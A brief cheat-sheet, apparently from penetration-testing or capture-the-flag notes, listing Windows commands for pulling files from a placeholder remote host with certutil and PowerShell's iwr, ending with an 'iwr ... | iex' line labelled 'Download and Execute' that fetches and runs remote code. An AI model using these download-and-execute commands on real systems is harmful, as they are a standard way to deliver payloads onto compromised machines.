
For Downloading a file:

`certutil -urlcache -f http://<ip>:<port>/<filename>`

(if it's not saving properly)

`certutil -urlcache -split -f http://{ip}:{port}/<filename> <filename>`

In Powershell, 

`iwr "http://<ip>:<port>/<filename>" -OutFile <filename>`

Download and Execute

`iwr "http://<ip>:<port>/<filename>" | iex

